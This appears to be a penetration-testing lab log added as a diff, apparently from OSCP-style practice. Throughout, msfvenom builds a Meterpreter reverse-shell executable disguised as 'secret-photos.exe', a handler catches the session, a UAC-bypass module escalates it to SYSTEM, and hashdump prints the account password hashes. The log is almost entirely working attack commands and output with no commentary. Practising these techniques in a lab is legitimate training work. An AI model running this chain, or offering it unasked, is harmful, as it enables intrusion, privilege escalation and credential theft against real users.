@@ -1,0 +1,128 @@
+root@alice:~# msfvenom -p windows/meterpreter/reverse_tcp -b "\x00" LHOST=192.168.209.143 LPORT=4444 -i 5 -f exe -o ./secret-photos.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 10 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+x86/shikata_ga_nai succeeded with size 395 (iteration=1)
+x86/shikata_ga_nai succeeded with size 422 (iteration=2)
+x86/shikata_ga_nai succeeded with size 449 (iteration=3)
+x86/shikata_ga_nai succeeded with size 476 (iteration=4)
+x86/shikata_ga_nai chosen with final size 476
+Payload size: 476 bytes
+Final size of exe file: 73802 bytes
+Saved as: ./secret-photos.exe
+root@alice:~# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  backdoor  core  cv  msfinstall  pwk_revisited_03272018  secret-photos.exe
+root@alice:~# mkdir win-rev-shell
+root@alice:~# mv sec* win-rev-shell/
+root@alice:~# cd win-rev-shell/
+root@alice:~/win-rev-shell# ls 
+secret-photos.exe
+root@alice:~/win-rev-shell# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.209.143; set LPORT 4444; exploit; exit -y"
+find: unknown predicate `-y'
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 192.168.209.143
+LPORT => 4444
+[*] Started reverse TCP handler on 192.168.209.143:4444 
+[*] Sending stage (179779 bytes) to 192.168.209.139
+[*] Meterpreter session 1 opened (192.168.209.143:4444 -> 192.168.209.139:58516) at 2018-04-19 21:10:42 -0600
+
+meterpreter > sysinfo
+Computer        : CLIENT
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x86/windows
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getuid
+Server username: client\offsec
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(multi/handler) > search bypassuac
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank       Description
+   ----                                              ---------------  ----       -----------
+   exploit/windows/local/bypassuac                   2010-12-31       excellent  Windows Escalate UAC Protection Bypass
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac
+msf exploit(windows/local/bypassuac) > info
+msf exploit(windows/local/bypassuac) > show options
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf exploit(windows/local/bypassuac) > set session 1
+session => 1
+msf exploit(windows/local/bypassuac) > exploit
+
+[*] Started reverse TCP handler on 192.168.209.143:5555 
+[*] UAC is Enabled, checking level...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[+] Part of Administrators group! Continuing...
+[*] Uploaded the agent to the filesystem....
+[*] Uploading the bypass UAC executable to the filesystem...
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (179779 bytes) to 192.168.209.147
+[*] Meterpreter session 2 opened (192.168.209.143:5555 -> 192.168.209.147:58532) at 2018-04-19 21:52:40 -0600
+
+meterpreter > getuid
+Server username: client\offsec
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+SeUndockPrivilege
+
+meterpreter > run hashdump
+
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
+[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY d1fd3fcf55a071b7a26927d5c0029a5f...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
+/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
+[*] Dumping password hints...
+
+offsec:"offsec"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+offsec:1001:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:37eb6b58fd3ec9fab4300bd9ec52a9a6:::
+victim:1003:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+username:1004:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+lowpriv:1005:aad3b435b51404eeaad3b435b51404ee:f671043ba08e88500d2eb5279ac65e53:::
